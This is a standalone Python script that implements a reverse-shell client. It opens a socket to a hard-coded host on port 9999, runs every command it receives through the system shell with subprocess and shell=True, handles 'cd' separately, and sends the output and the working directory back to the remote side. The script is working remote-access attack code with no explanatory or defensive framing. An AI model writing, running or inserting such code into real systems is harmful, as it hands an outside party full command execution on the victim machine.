import os
import socket
import subprocess

socket_obj = socket.socket()
host = "ssc-vm-g4-rhev4-0483"
port = 9999
socket_obj.connect((host, port))

while True:
    data = socket_obj.recv(1024)
    if data[:2].decode('utf-8') == "cd":
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,\
             stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, 'utf-8')
        socket_obj.send(str.encode(output_str + str(os.getcwd()) + '> '))
        print(output_str)

socket_obj.close()

